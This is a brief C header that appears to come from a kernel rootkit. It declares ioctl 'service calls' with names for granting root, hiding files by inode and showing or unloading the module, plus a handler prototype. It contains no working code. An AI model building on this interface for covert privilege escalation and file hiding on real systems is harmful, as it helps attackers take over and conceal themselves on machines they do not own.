enum service_calls {
    SERVICE_SHOW=0,
    SERVICE_UNLOAD,
    SERVICE_CHANGE_FD,
    SERVICE_PING,
    SERVICE_CHANGE_PING_ARG,
    SERVICE_GIVE_ROOT,
    SERVICE_HIDE_FILE_INODE
};

int handle_ioctl_request(unsigned int fd, unsigned int cmd, unsigned long arg);